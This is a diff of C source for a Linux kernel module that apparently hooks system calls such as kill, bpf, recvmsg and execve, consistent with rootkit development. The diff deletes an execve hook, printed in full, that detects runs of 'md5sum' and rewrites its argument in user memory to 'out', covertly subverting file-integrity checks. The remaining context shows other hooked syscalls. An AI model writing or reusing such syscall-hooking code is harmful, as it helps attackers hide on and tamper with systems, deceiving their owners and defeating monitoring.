@@ -32,7 +32,6 @@
 sys64 real_m_exit_group;
 sys64 real_m_clone;
 sys64 real_m_kill;
-sys64 real_m_execve;
 sys64 real_m_read;
 sys64 real_m_bpf;
 sys64 real_m_recvmsg;
@@ -618,69 +617,6 @@ err:
 leave:
 	kfree(kbuf);
 	return ret;
-}
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-struct user_arg_ptr {
-#ifdef CONFIG_COMPAT
-	bool is_compat;
-#endif
-	union {
-		const char __user *const __user *native;
-#ifdef CONFIG_COMPAT
-		const compat_uptr_t __user *compat;
-#endif
-	} ptr;
-};
-#endif
-
-static const char __user *get_user_arg_ptr(struct user_arg_ptr argv, int nr)
-{
-	const char __user *native;
-
-#ifdef CONFIG_COMPAT
-	if (unlikely(argv.is_compat)) {
-		compat_uptr_t compat;
-
-		if (get_user(compat, argv.ptr.compat + nr))
-			return (ERR_PTR(-EFAULT));
-		return (compat_ptr(compat));
-	}
-#endif
-
-	if (get_user(native, argv.ptr.native + nr))
-		return (ERR_PTR(-EFAULT));
-	return (native);
-}
-
-static asmlinkage long __attribute__((unused)) m_execve(struct pt_regs *regs)
-{
-	char exe[128] = { 0 };
-	struct user_arg_ptr argvx = { .ptr.native = PT_REGS_PARM2(regs) };
-	const char __user *native = get_user_arg_ptr(argvx, 0);
-	if (IS_ERR(native))
-		goto real;
-
-	if (copy_from_user(exe, native, sizeof(exe)))
-		goto real;
-	prinfo("%s\n", exe);
-
-	if (!strcmp(exe, "md5sum")) {
-		prinfo("Exe: '%s'\n", exe);
-		memset(exe, 0, sizeof(exe));
-		native = get_user_arg_ptr(argvx, 1);
-		if (IS_ERR(native))
-			goto real;
-
-		if (copy_from_user(exe, native, sizeof(exe)))
-			goto real;
-		prinfo("Arg: '%s'\n", exe);
-		if (copy_to_user((char __user *)native, "out", 3))
-			prerr("m_execve: copy_to_user\n");
-	}
-
-real:
-	return real_m_execve(regs);
 }
 
 struct tcpudpdata {
